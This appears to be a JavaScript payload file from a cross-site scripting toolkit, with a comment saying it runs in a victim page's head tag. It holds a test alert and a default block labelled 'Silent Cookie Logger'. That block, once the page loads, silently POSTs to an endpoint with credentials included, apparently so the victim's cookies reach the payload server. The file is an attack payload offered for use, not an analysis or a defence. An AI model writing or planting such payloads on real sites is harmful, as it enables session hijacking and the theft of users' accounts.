/*
REMEMBER! 
This file is run in the head tag, so make sure that your payloads are run after the body has loaded, if neceessary.
*/

alert('Test payload')

/* Silent Cookie Logger (DEFAULT) */
document.addEventListener("DOMContentLoaded", function() {
    fetch('/ep/api/ping', { method: 'POST', credentials: 'include' });
});